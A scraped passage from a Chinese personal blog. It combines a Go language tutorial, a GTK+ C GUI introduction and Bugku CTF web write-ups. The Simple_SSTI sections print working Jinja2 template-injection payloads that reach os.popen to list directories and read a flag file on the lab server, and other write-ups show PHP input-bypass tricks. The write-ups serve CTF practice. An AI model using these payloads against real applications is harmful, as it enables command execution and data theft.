Book1.subject) fmt.Printf(\u0026#34;Book1 id: %d\\n\u0026#34;, Book1.id) fmt.Printf(\u0026#34;Book2 title: %s\\n\u0026#34;, Book2.title) fmt.Printf(\u0026#34;Book2 author: %s\\n\u0026#34;, Book2.author) fmt.Printf(\u0026#34;Book2 subject: %s\\n\u0026#34;, Book2.subject) fmt.Printf(\u0026#34;Book2 id: %d\\n\u0026#34;, Book2.id) } type Books struct { title string author string subject string id int } 执行结果：\nBook1 title: C语言\rBook1 author: DC\rBook1 subject: 编程\rBook1 id: 1\rBook2 title: Python语言\rBook2 author: DC\rBook2 subject: 编程\rBook2 id: 2\r结构体作为函数参数 我们可以像其它数据类型一样将结构体类型作为参数传递给函数。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var Book1 Books var Book2 Books Book1.title = \u0026#34;C语言\u0026#34; Book1.author = \u0026#34;DC\u0026#34; Book1.subject = \u0026#34;编程\u0026#34; Book1.date = \u0026#34;2021-03-19\u0026#34; Book2.title = \u0026#34;Python\u0026#34; Book2.author = \u0026#34;DC\u0026#34; Book2.subject = \u0026#34;编程\u0026#34; Book2.date = \u0026#34;2021-03-19\u0026#34; printBook(Book1) printBook(Book2) } type Books struct { title string author string subject string date string } func printBook(book Books) { fmt.Printf(\u0026#34;Title: %s\\n\u0026#34;, book.title) fmt.Printf(\u0026#34;Author: %s\\n\u0026#34;, book.author) fmt.Printf(\u0026#34;Subject: %s\\n\u0026#34;, book.subject) fmt.Printf(\u0026#34;Date: %s\\n\u0026#34;, book.date) } 执行结果：\nTitle: C语言\rAuthor: DC\rSubject: 编程\rDate: 2021-03-19\rTitle: Python\rAuthor: DC\rSubject: 编程\rDate: 2021-03-19\r结构体指针 定义结构体指针其实类似于其它指针变量：\nvar strcut_pointer *ptr 以上定义的指针变量可以存储结构体变量地址。我们可以通过\u0026amp;符号查看结构体变量地址：\nstruct_pointer = \u0026amp;ptr 使用结构体指针访问结构体成员，使用.：\nstruct_pointer.title 我们用指针重写一下之前结构体的实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var Book1 Books var Book2 Books Book1.title = \u0026#34;C语言\u0026#34; Book1.author = \u0026#34;DC\u0026#34; Book1.subject = \u0026#34;编程\u0026#34; Book1.date = \u0026#34;2021-03-19\u0026#34; Book2.title = \u0026#34;Python\u0026#34; Book2.author = \u0026#34;DC\u0026#34; Book2.subject = \u0026#34;编程\u0026#34; Book2.date = \u0026#34;2021-03-19\u0026#34; printBook(\u0026amp;Book1) printBook(\u0026amp;Book2) } type Books struct { title string author string subject string date string } func printBook(book *Books) { fmt.Printf(\u0026#34;Title: %s\\n\u0026#34;, book.title) fmt.Printf(\u0026#34;Author: %s\\n\u0026#34;, book.author) fmt.Printf(\u0026#34;Subject: %s\\n\u0026#34;, book.subject) fmt.Printf(\u0026#34;Date: %s\\n\u0026#34;, book.date) } 切片 切片是对数组的抽象。\nGo 中数组长度不可变，不适用部分特定场景，Go 提供了一种灵活且功能强悍的内置类型——切片(\u0026ldquo;动态数组\u0026rdquo;)。与数组相比，切片长度不固定，可以追加元素，在追加时可能使切片容量增大。\n定义切片 声明一个未指定长度的数组来定义切片：\nvar identifier []type 切片不需要指定长度。\n我们还可以使用make()函数创建切片：\nvar slice1 []type = make([]type, len) slice1 := make([]type, len) 也可以指定容量，capacity为可选参数：\nmake([]T, length, capacity) 此处的len是数组长度也是切片初始长度。\n切片初始化 直接初始化切片，[]表示切片类型，{1,2,3}初始化值依次为1,2,3，cap=len=3：\ns := [] int {1,2,3} 初始化切片s，是数组arr的引用：\ns := arr[:] 将arr中下标为startIndex到endIndex-1下的元素创建为一个新的切片：\ns := arr[startIndex:endIndex] 默认endIndex时将表示一直到arr的最后一个元素：\ns := arr[startIndex:]\r默认startIndex时表示从arr的第一个元素开始：\ns := arr[:endIndex] 通过切片s初始化切片s1：\ns1 := s[startIndex:endIndex] 通过内置函数make()初始化切片s，[]int标识其元素类型为int的切片：\ns := make([]int, len, cap) len()和cap()函数 切片可索引，且可由len()方法获取长度。\n切片提供了计算容量的方法，cap()可以测量切片长度上限。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var nums = make([]int, 3, 5) printSlice(nums) } func printSlice(x []int) { fmt.Printf(\u0026#34;len=%d cap=%d slice=%v\u0026#34;, len(x), cap(x), x) } 执行结果：\nlen=3 cap=5 slice=[0 0 0]\r空切片 切片在未初始化之前默认为nil，长度为0。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var nums[] int printSlice(nums) if (nums == nil) { fmt.Println(\u0026#34;切片为空!\u0026#34;) } } func printSlice(x []int) { fmt.Printf(\u0026#34;len=%d cap=%d slice=%v\\n\u0026#34;, len(x), cap(x), x) } 执行结果：\nlen=0 cap=0 slice=[]\r切片为空!\r切片截取 可通过设置上下限设置截取切片。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { nums := []int{1,2,3,4,5,6,7,8,9} printSlice(nums) fmt.Println(\u0026#34;nums=\u0026#34;,nums) fmt.Println(\u0026#34;nums[1:4]=\u0026#34;,nums[1:4]) fmt.Println(\u0026#34;nums[:3]=\u0026#34;,nums[:3]) fmt.Println(\u0026#34;nums[4:]=\u0026#34;,nums[4:]) nums1 := make([]int, 0, 5) printSlice(nums1) num2 := nums[:2] printSlice(num2) num3 := nums[2:5] printSlice(num3) } func printSlice(x []int) { fmt.Printf(\u0026#34;len=%d cap=%d slice=%v\\n\u0026#34;, len(x), cap(x), x) } 执行结果：\nlen=9 cap=9 slice=[1 2 3 4 5 6 7 8 9]\rnums= [1 2 3 4 5 6 7 8 9]\rnums[1:4]= [2 3 4]\rnums[:3]= [1 2 3]\rnums[4:]= [5 6 7 8 9]\rlen=0 cap=5 slice=[]\rlen=2 cap=9 slice=[1 2]\rlen=3 cap=7 slice=[3 4 5]\r前闭后开。\nappend()与copy()函数 若想增加切片容量，我们要创建一个新的更大的切片并把原切片内容拷贝过来，接下来我们通过copy与append方法。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var nums []int printSlice(nums) nums = append(nums, 0) printSlice(nums) nums = append(nums, 1) printSlice(nums) nums = append(nums, 1, 2, 3) printSlice(nums) nums1 := make([]int, len(nums), (cap(nums))*2) copy(nums1, nums) printSlice(nums1) } func printSlice(x []int) { fmt.Printf(\u0026#34;len=%d cap=%d slice=%v\\n\u0026#34;, len(x), cap(x), x) } 执行结果：\nlen=0 cap=0 slice=[]\rlen=1 cap=1 slice=[0]\rlen=2 cap=2 slice=[0 1]\rlen=5 cap=6 slice=[0 1 1 2 3]\rlen=5 cap=12 slice=[0 1 1 2 3]\rRange Go 语言中range关键字由于for循环中迭代数组(array)、切片(slice)、通道(channel)或集合(map)的元素，在数组和切片中它返回元素的索引及索引对应的值。即键值对。(key-value)\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { nums := []int{2, 3, 4} sum := 0 for _, num := range nums { sum += num } fmt.Println(\u0026#34;sum:\u0026#34;, sum) for i, num := range nums { if num == 3 { fmt.Println(\u0026#34;index:\u0026#34;, i) } } kvs := map[string]string{\u0026#34;a\u0026#34;:\u0026#34;apple\u0026#34;, \u0026#34;b\u0026#34;:\u0026#34;banana\u0026#34;} for k, v := range kvs { fmt.Printf(\u0026#34;%s -\u0026gt; %s\\n\u0026#34;, k, v) } for i, c := range \u0026#34;go\u0026#34; { fmt.Println(i, c) } } 执行结果：\nsum: 9\rindex: 1\ra -\u0026gt; apple\rb -\u0026gt; banana\r0 103\r1 111\rMap Map是一种无需的键值对集合，它最重要的一点是通过key来快速检索数据，key类似于索引，指向数据的值。\n我们可以像迭代数组和切片那样迭代Map，但Map时无序的，我们无法决定它的返回顺序，因为Map使用hash表实现。\n定义Map 1.使用内建函数make\n2.使用map关键字：\nvar map_variable map[key_data_type]value_data_type map_variable := make(map[key_data_type]value_type) 若不初始化map，那么会创建一个nil map，nil map不能用来存放键值对。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var testMap map[string]string testMap = make(map[string]string) testMap [\u0026#34;人文\u0026#34;] = \u0026#34;法学\u0026#34; testMap [\u0026#34;数计\u0026#34;] = \u0026#34;计算机\u0026#34; testMap [\u0026#34;外国语\u0026#34;] = \u0026#34;翻译\u0026#34; testMap [\u0026#34;智能制造\u0026#34;] = \u0026#34;嵌入式\u0026#34; for aca := range testMap { fmt.Println(aca, \u0026#34;招牌是\u0026#34;, testMap [aca]) } maj, ok := testMap [\u0026#34;土木\u0026#34;] if (ok) { fmt.Println(\u0026#34;土木的招牌是:\u0026#34;, maj) } else { fmt.Println(\u0026#34;值不存在\u0026#34;) } } 执行结果：\n智能制造 招牌是 嵌入式\r人文 招牌是 法学\r数计 招牌是 计算机\r外国语 招牌是 翻译\r值不存在\rdelete()函数 delete()函数用于删除集合元素，参数为map和其对应的key。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { testMap := map[string]string{\u0026#34;一\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;二\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;三\u0026#34;: \u0026#34;3\u0026#34;} fmt.Println(\u0026#34;原始数据\u0026#34;) for i := range testMap { fmt.Println(i, \u0026#34;值为\u0026#34;, testMap [i]) } delete(testMap, \u0026#34;一\u0026#34;) fmt.Println(\u0026#34;一被删除\u0026#34;) fmt.Println(\u0026#34;删除后数据\u0026#34;) for i := range testMap { fmt.Println(i, \u0026#34;值为\u0026#34;, testMap [i]) } } 执行结果：\n原始数据\r一 值为 1\r二 值为 2\r三 值为 3\r一被删除\r删除后数据\r三 值为 3\r二 值为 2\r递归函数 Go 支持递归，但在使用时需要设置退出条件，否则将陷入无限循环。\n阶乘 import \u0026#34;fmt\u0026#34; func main() { var i int = 15 fmt.Printf(\u0026#34;%d的阶乘为:%d\\n\u0026#34;, i, Factorial(uint64(i))) } func Factorial(n uint64)(res uint64) { if (n \u0026gt; 0) { res = n * Factorial(n-1) return res } return 1 } 执行结果：\n15的阶乘为:1307674368000\r斐波那契数列 package main import \u0026#34;fmt\u0026#34; func main() { var i int for i = 0; i \u0026lt; 10; i++ { fmt.Printf(\u0026#34;%d\\t\u0026#34;, fibonacci(i)) } } func fibonacci(n int) int { if n \u0026lt; 2 { return n } return fibonacci(n-2) + fibonacci(n-1) } 执行结果：\n0 1 1 2 3 5 8 13 21 34\r类型转换  注:Go 不支持隐式转换\n 基本格式:\ntype_name(expression) 类型 表达式 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var res float32 var sum = 17 var count = 5 res = float32(sum)/float32(count) fmt.Printf(\u0026#34;%f\\n\u0026#34;, res) } 执行结果:\n3.400000\r接口 Go 中提供了另一种数据类型，接口。它把所有具有共性的方法定义在一起，任何其它类型只要实现了这些方法就是实现了这个接口。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var phone Phone phone = new(NokiaPhone) phone.call() phone = new (IPhone) phone.call() } type Phone interface { call() } type NokiaPhone struct { } func (nokiaPhone NokiaPhone) call() { fmt.Println(\u0026#34;This is Nokiad\u0026#34;) } type IPhone struct { } func (iPhone IPhone) call() { fmt.Println(\u0026#34;iPhone plz!\u0026#34;) } 执行结果：\nThis is Nokiad\riPhone plz!\r错误处理 Go 通过内置的错误接口提供了非常简单的错误处理机制。\nerror类型是一个接口类型，定义如下：\ntype error interface { Error() string } 我们可以在编码中通过实现error接口类型来生成错误信息。\n函数通常在最后的返回值中返回错误信息，使用error New可返回一个错误信息：\nfunc Sqrt(f float64) (float64, error) { if f \u0026lt; 0 { return 0, errors.New(\u0026#34;math: square root of negative number\u0026#34;) } } 我们在调用Sqrt的时候传递一个负数，然后得到non-nil的error对象，将此对象与nil比较，结果为true，所以fmt.Println(fmt包在处理error时会调用Error方法)被调用，输出错误，实例如下：\nres, err := Sqrt(-1) if err != nil { fmt.Println(err) } 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { if res, errorMsg := Divide(100, 10); errorMsg == \u0026#34;\u0026#34; { fmt.Println(\u0026#34;100/10 = \u0026#34;, res) } if _, errorMsg := Divide(100, 0); errorMsg != \u0026#34;\u0026#34; { fmt.Println(\u0026#34;errorMsg:\u0026#34;, errorMsg) } } type DivideError struct { dividee int divider int } func (de *DivideError) Error() string { strFormat := ` Cannot proceed, the divider is zero! dividee: %d divider: 0 ` return fmt.Sprintf(strFormat, de.dividee) } func Divide(varDividee int, varDivider int) (res int, errorMsg string) { if varDivider == 0 { dData := DivideError { dividee: varDividee, divider: varDivider, } errorMsg = dData.Error() return } else { return varDividee / varDivider, \u0026#34;\u0026#34; } } 执行结果：\n100/10 = 10\rerrorMsg:\rCannot proceed, the divider is zero!\rdividee: 100\rdivider: 0\r并发 Go 支持并发，我们只需通过go关键字开启goroutine即可。\ngoroutine是轻量级线程，调度是由Golang 运行时进行管理的。\ngoroutine语法格式：\ngo 函数名(参数列表) 如：\ngo f(x, y, z) 开启一个新routine：\nf(x, y, z) Go 允许使用go语句开启一个新的运行期线程，即goroutine。以一个不同的、新创建的goroutine来执行一个函数。同一个程序中所有goroutine共享一个地址空间。\n实例：\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { go say(\u0026#34;world\u0026#34;) say(\u0026#34;hello\u0026#34;) } func say(s string) { for i := 0; i \u0026lt; 5; i++ { time.Sleep(100 * time.Millisecond) fmt.Println(s) } } 执行结果：\nworld\rhello\rworld\rhello\rhello\rworld\rworld\rhello\rhello\r通道(channel) 通道是用来传递数据的一个数据结构，可用于两个goroutine之间通过传递一个指定类型的值来同步运行和通讯。操作符\u0026lt;-用于指定通道方向，发送或接收。若未指定方向，则为双向通道。\nch \u0026lt;- v\t// 把v发送到通道ch v := \u0026lt;-ch\t// 从ch接收数据并把值赋给v 通道在使用前必须先创建：\nch := make(chan int)  注：默认情况下通道不带缓冲区。发送端发送数据，同时必须有接收端接收相应数据。\n 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { s := []int{7, 2, 8, -9, 4, 1} c := make(chan int) go sum(s[:len(s)/2], c) go sum(s[len(s)/2:], c) x, y := \u0026lt;-c, \u0026lt;-c fmt.Println(x, y, x+y) } func sum(s []int, c chan int) { sum := 0 for _, v := range s { sum += v } c \u0026lt;- sum } 执行结果：\n-4 17 13\r通道缓冲区 通道可以设置缓冲区，通过make的第二个参数指定缓冲区大小。\nch := make(chan int, 100) 带缓冲区的通道允许发送端数据发送和接收端的数据获取处于异步状态，但由于缓冲区大小有限，所以必须由接收端来接收数据。\n 注:若通道不带缓冲，发送方会阻塞直到接收方从通道中接收了值。若通道带缓冲，发送方会阻塞直到发送的值被拷贝到缓冲区中，若缓冲区已满，则意味着需要等待直到接收方获取到一个值。接收方在有值可以接收之前会一直阻塞。\n 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { ch := make(chan int, 2) ch \u0026lt;- 1 ch \u0026lt;- 2 fmt.Println(\u0026lt;-ch) fmt.Println(\u0026lt;-ch) } 执行结果：\n1\r2\rGo遍历与关闭通道 Go通过range关键字来实现遍历读取到的数据，类似于数组或切片。格式如下：\nv, ok := \u0026lt;- ch 若通道接收不到数据后ok为false，这时通道可以使用close()函数关闭。\n实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { c := make(chan int, 10) go fibonacci(cap(c), c) for i := range c { fmt.Println(i) } } func fibonacci(n int, c chan int) { x, y := 0, 1 for i := 0; i \u0026lt; n; i++ { c \u0026lt;- x x, y = y, x+y } close(c) } 执行结果：\n0\r1\r1\r2\r3\r5\r8\r13\r21\r34\r 本文链接：Go | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/golang/","summary":"runoob教程:Go 语言教程 | 菜鸟教程 (runoob.com)\n环境搭建 安装包官方下载地址：Downloads - The Go Programming Language (golang.org)\n国内能打开的地址：Downloads - The Go Programming Language (google.cn)\nWindows安装go 安装包下载 这里我选择下载msi文件的go1.16.2.windows-amd64.zip压缩包，然后放在环境目录D:\\Env\\go1.16.2\\bin下解压。\n环境配置 将go目录下的/bin路径添加到Path环境变量中，点击新建。\n检测安装 打开cmd输入go。\nhello-world 在工作目录创建hello.go文件。\npackage main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;Hello, World!\u0026#34;) } 使用go run命令运行:\ngo run hello.go go build生成二进制文件运行:\n\u0026gt; go build .\\hello.go \u0026gt; ls Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 2021/3/15 10:50 2094592 hello.exe -a---- 2021/3/15 10:47 79 hello.go \u0026gt; .","title":"Golang"},{"content":"GTK+简介 GTK+(Gnome Toolkit+)最初是为GIMP(GNU Image Manipulation Program)写的，在开发早期GIMP版本时，Peter Mattis 和 Spencer Kimball创建了GTK(GIMP Toolkit)作为Motif收费工具包的替代。当GTK获得了面向对象特性和可扩展性后，才变为了GTK+。\nGTK+特点 稳定、跨平台、多语言绑定、接口丰富、与时俱进、算法丰富、移动嵌入式应用广泛.\n学习手册  GTK+2手册：GTK+ 2 Reference Manual - GNOME Developer Center GTK+3手册：GTK+ 3 Reference Manual - GNOME Developer Center 中文手册：介绍 - 《GTK+3 参考手册》 - 书栈网 · BookStack  GTK程序简介  使用gcc编译时加上pkg-config --cflags --libs gtk+-2.0，或者直接使用makefile编译\n 例: gcc demo.c -o demo `pkg-config --cflags --libs gtk+-2.0` 自动获得预处理参数，如宏定义、头文件位置 自动获得链接参数，如库、依赖库位置、文件名及其它参数 GTK程序基本框架 #include \u0026lt;gtk/gtk.h\u0026gt; int main(int argc, char *argv[]) { gtk_init(\u0026amp;argc, \u0026amp;argv);\t// 初始化  // 代码区  gtk_main();\t// 主事件循环  return 0; } 分析：\n\u0026lt;gtk/gtk.h\u0026gt;\t// 头文件，包括了GTK+所有控件、变量、函数和结构的声明 gtk_init()\t// 必须在控件定义之前使用，参数由命令中解析出来并送到程序中。主要作用为设立GTK+运行环境，自动完成一些必要的初始化工作 gtk_main()\t// 程序运行停在这里等待事件(如键盘或鼠标事件)的发生，等待用户操作窗口。这个函数在所有GTK+程序中都要调用 GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL)\t// GtkWidget是GTK+控件类型，GtkWidget*能指向任何控件的指针类型 gtk_window_new()\t// 创建一个窗口并返回这个窗口的控件指针 GTK_WINDOW_TOPLEVEL\t// 指明窗口类型为最上层主窗口 gtk_widget_show(window)\t// 显示上一步创建的窗口控件  控件介绍\n 1.控件是对数据和方法的封装。控件有自己的属性和方法，属性是指控件的特征，方法是指控件的一些简单可见的功能。\n2.控件的分类:容器控件与非容器控件。\n容器控件:可以容纳别的控件。容器控件分为两类，一类只能容纳一个控件，如窗口、按钮；另一类则能容纳多个控件，如布局控件。\n非容器控件:不可以容纳别的控件，如标签、行编辑。\n 控件类型的转换\n 使用控件接口时，一定要注意参数类型是否匹配。\n窗口 // 窗口创建 GtkWidget *window = gtk_window_new(GtkWindowType); GtkWindowType是一个枚举，具体有两种情况: GTK_WINDOW_TOPLEVEL\t// 有边框 GTK_WINDOW_POPUP\t// 无边框  // 标题设置 void gtk_window_set_title(GtkWindow *window, const gchar *title); // 窗口最小尺寸设置 void gtk_widget_set_size_request(GtkWidget *widget,gint width,gint height); // 窗口伸缩设置 void gtk_window_set_resizable(GtkWindow *window, gboolean resizable); // 显示或隐藏所有控件 void gtk_widget_show_all(GtkWidget *widget); void gtk_widget_hide_all(GtkWidget *widget); // 窗口在显示器位置设置 void gtk_window_set_position(GtkWindow *window, GtkWindowPosition position); position常用有四种情况: GTK_WIN_POS_NONE\t// 不固定 GTK_WIN_POS_CENTER\t// 居中 GTK_WIN_POS_MOUSE\t// 出现在鼠标位置 GTK_WIN_POS_CENTER_ALWAYS\t//窗口总是居中 实例 #include \u0026lt;gtk/gtk.h\u0026gt; // 头文件 int main(int argc,char *argv[]) { gtk_init(\u0026amp;argc, \u0026amp;argv); // 初始化 // 创建顶层窗口  GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL); // 设置窗口标题  gtk_window_set_title(GTK_WINDOW(window), \u0026#34;Window\u0026#34;); // 设置窗口在显示器中的位置为居中  gtk_window_set_position(GTK_WINDOW(window), GTK_WIN_POS_CENTER); // 设置窗口最小尺寸  gtk_widget_set_size_request(window, 400, 300); // 固定窗口的大小 \tgtk_window_set_resizable(GTK_WINDOW(window), FALSE); // \u0026#34;destroy\u0026#34; 和 gtk_main_quit 连接，关闭窗口时程序自动停止，否则需要按ctrl+c \tg_signal_connect(window, \u0026#34;destroy\u0026#34;, G_CALLBACK(gtk_main_quit), NULL); gtk_widget_show_all(window); // 显示窗口全部控件  //gtk_widget_hide_all(window); // 隐藏窗口  gtk_main(); // 主事件循环  return 0; } 窗口截图：\n按钮 // 创建一个带内容的按钮 GtkWidget* gtk_button_new_with_label(const gchar *label); // 获得按钮文本内容 const gchar* gtk_button_get_label(GtkButton *button ); // 将控件添加到窗口容器 void gtk_container_add(GtkContainer *container, GtkWidget *widget); container:容纳控件的容器；widget:要添加的控件 实例 #include \u0026lt;gtk/gtk.h\u0026gt;\t// 头文件 int main(int argc, char *argv[]) { gtk_init(\u0026amp;argc, \u0026amp;argv);\t// 初始化  GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);\t// 创建顶层窗口 \t// 设置窗口边框宽度(窗口里的控件与窗口边框间隔为15) \tgtk_container_set_border_width(GTK_CONTAINER(window), 15); // 创建按钮，文本信息为\u0026#34;Hello World\u0026#34; \tGtkWidget *button = gtk_button_new_with_label(\u0026#34;Hello World\u0026#34;); const char *str = gtk_button_get_label(GTK_BUTTON(button));\t// 获得按钮的内容 \tprintf(\u0026#34;str = %s\\n\u0026#34;, str);\t// 打印到终端  // 把按钮放入窗口(窗口也是一种容器) \tgtk_container_add(GTK_CONTAINER(window), button); // 显示控件有两种方法:逐个显示，全部显示 \t// gtk_widget_show(button); \t// gtk_widget_show(window); \tgtk_widget_show_all(window);\t// 显示窗口全部控件  gtk_main();\t// 主事件循环  return 0; } 运行截图：\n信号与回调函数 GTK+采用信号与回调函数处理窗口外部传来的事件、消息或信号。当信号发生时，程序自动调用为信号连接的回调函数。\n// 窗口关闭时触发的常用信号 destroy、delete-event // 操作按钮触发的常用信号 clicked、pressed、released // 信号与回调函数的连接 gulong g_signal_connect(gpointer instance, const gchar *detailed_signal, GCallback c_handler, gpointer data); instance\t:\t信号发出者 detailed_signale\t:\t要连接的信号名称 c_handler\t:\t回调函数名称，需要使用G_CALLBACK进行转换 data\t:\t传递给回调函数的参数 // 信号连接函数的写法 g_signal_connect(button, \u0026#34;pressed\u0026#34;, G_CALLBACK(callback), NULL); // 回调函数的定义 void callback(GtkButton *button, gpointer user_data); button\t:\t信号发出者 user_data\t:\t传递给回调函数的参数 实例 #include \u0026lt;gtk/gtk.h\u0026gt;\t// 头文件 // 按钮按下的处理函数, gpointer 相当于 void * void deal_pressed(GtkButton *button, gpointer user_data) { // 获得按钮的文本信息 \tconst gchar *text = gtk_button_get_label( button ); // g_print() 相当于C语言的 printf(), gchar相当于char \tg_print(\u0026#34;button_text = %s; user_data = %s\\n\u0026#34;, text, (gchar *)user_data); } int main( int argc,char *argv[] ) { gtk_init(\u0026amp;argc, \u0026amp;argv);\t// 初始化  GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL); // 创建顶层窗口 \t// 设置窗口边框的宽度(窗口里的控件与窗口边框间隔为15) \tgtk_container_set_border_width(GTK_CONTAINER(window), 15); /* 当窗口关闭时，窗口会触发destroy信号， * 自动调用gtk_main_quit()结束程序运行。 */ g_signal_connect(window, \u0026#34;destroy\u0026#34;, G_CALLBACK(gtk_main_quit), NULL); GtkWidget *button = gtk_button_new_with_label(\u0026#34;Hello GTK+\u0026#34;); // 创建按钮 \tgtk_container_add(GTK_CONTAINER(window), button);\t// 把按钮放入窗口(窗口也是一种容器)  /* 按钮按下(pressed)后会自动调用deal_pressed() * \u0026#34;is pressed\u0026#34;是传给deal_pressed()的数据 */ g_signal_connect(button, \u0026#34;pressed\u0026#34;, G_CALLBACK(deal_pressed), \u0026#34;is pressed\u0026#34;); gtk_widget_show_all(window);\t// 显示窗口全部控件  gtk_main();\t// 主事件循环  return 0; } 运行截图：\n 本文链接：GTK+ | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/gtk+/","summary":"GTK+简介 GTK+(Gnome Toolkit+)最初是为GIMP(GNU Image Manipulation Program)写的，在开发早期GIMP版本时，Peter Mattis 和 Spencer Kimball创建了GTK(GIMP Toolkit)作为Motif收费工具包的替代。当GTK获得了面向对象特性和可扩展性后，才变为了GTK+。\nGTK+特点 稳定、跨平台、多语言绑定、接口丰富、与时俱进、算法丰富、移动嵌入式应用广泛.\n学习手册  GTK+2手册：GTK+ 2 Reference Manual - GNOME Developer Center GTK+3手册：GTK+ 3 Reference Manual - GNOME Developer Center 中文手册：介绍 - 《GTK+3 参考手册》 - 书栈网 · BookStack  GTK程序简介  使用gcc编译时加上pkg-config --cflags --libs gtk+-2.0，或者直接使用makefile编译\n 例: gcc demo.c -o demo `pkg-config --cflags --libs gtk+-2.0` 自动获得预处理参数，如宏定义、头文件位置 自动获得链接参数，如库、依赖库位置、文件名及其它参数 GTK程序基本框架 #include \u0026lt;gtk/gtk.h\u0026gt; int main(int argc, char *argv[]) { gtk_init(\u0026amp;argc, \u0026amp;argv);\t// 初始化  // 代码区  gtk_main();\t// 主事件循环  return 0; } 分析：","title":"GTK+"},{"content":"Bugku Web Web1  Des：flag{}。\n 查看源码即可。\nWeb2  Des：输入验证码即可得到flag。\n 输入框有输入长度限制，在控制台修改长度即可。\nWeb3  Des：flag{}。\n 通过get传参，按照题目要求直接传入\n?what=flag\rWeb4  Des:post。\n 方法1 利用hackbar直接post传参。\n方法2 利用burp抓包传值。\n方法3 编写python脚本。\nimport requests s = requests.Session() r = s.get(\u0026#34;\u0026lt;url\u0026gt;\u0026#34;) value = {\u0026#39;what\u0026#39;:\u0026#39;flag\u0026#39;} r = s.post(\u0026#34;\u0026lt;url\u0026gt;\u0026#34;, value) print(r.text) 题目更新  Des:看看源代码吧。\n 查看源代码，发现有两串编码字符串。\n分别对两个字符串进行URL解码：\n按照代码含义将其组合起来：\n放到控制台Console里排版。\n将if判断里与a.value判等的值输入提交框，提交。\n获得flag。\nWeb5  Des:矛盾。\n $num = $_GET[\u0026#39;num\u0026#39;]; if (!isnumeric($num)) { echo $num; if ($num == 1) echo \u0026#39;flag{********}\u0026#39;; } 利用1a绕过，例：\n?num=1a01\rWeb6  Des:flag{}。\n 查看源码。\nUnicode编码，解码即可。\nWeb7  Des:你必须让它停下。\n burp抓包，使用重放(Repeater)模块不断点击go发送页面，注意查看response。\nWeb8  Des:文件包含。\n 打开题目获得代码：\n\u0026lt;?php extract($_GET) if (!empty($ac)) { $f = trim(file_get_contents($fn)); if ($ac == $f) { echo \u0026#34;\u0026lt;p\u0026gt;This is flag:\u0026#34; .\u0026#34;$flag\u0026lt;/p\u0026gt;\u0026#34;; } else { echo \u0026#34;\u0026lt;p\u0026gt;sorry!\u0026lt;/p\u0026gt;\u0026#34;; } } ?\u0026gt;按照题目描述，尝试访问flag.txt，\n文件内容为flags，获得flag的条件是ac和fn严格相等，fn从flag.txt进行赋值，通过GET传参?ac=flags\u0026amp;fn=flag.txt。\n获得flag。\n题目更新 ?hello=file(\u0026#39;flag.php\u0026#39;) Web9  Des:N/A。\n eval(\u0026#34;var_dump($$args);\u0026#34;) # 调用两次，$($argc) 调用全局变量打印所有内容，尝试GLOBAL和GLOBALS。\nSimple_SSTI_1  Des:N/A。\n 页面显示：\nYou need pass in a parameter named flag。\r查看源码：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Simple SSTI\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; You need pass in a parameter named flag。 \u0026lt;!-- You know, in the flask, We often set a secret_key variable.--\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 搜了一下，SECRET_KEY是Flask中一个比较重要的变量值。\n?flag=flag\r# 页面回显flag\r?flag=2*2\r# 回显4，说明我们传入的数据是被信任的，存在ssti\r?flag=app.config['SECRET_KEY']\r# 回显报错\r?flag=config['SECRET_KEY']\r# 获得flag\rSimple_SSTI_2  Des:N/A。\n 页面和上题一样，也是模板注入。\n查看源码：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Simple SSTI2\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; You need pass in a parameter named flag \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 查看根目录：\n?flag={{config.__class__.__init__.__globals__['os'].popen('ls ..').read()}}\r执行结果：\napp bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var\r我们挨个查看目录，从第一个开始：\n?flag={{config.__class__.__init__.__globals__['os'].popen('ls ../app/').read()}}\r执行结果：\nDockerfile app.py flag gunicorn.conf.py templates\r直接查看flag文件：\n?flag={{config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read()}}\r获得flag。\nWeb10  Des:头等舱。\n F12在Network查看消息头即可。\n计算器  Des:N/A。\n 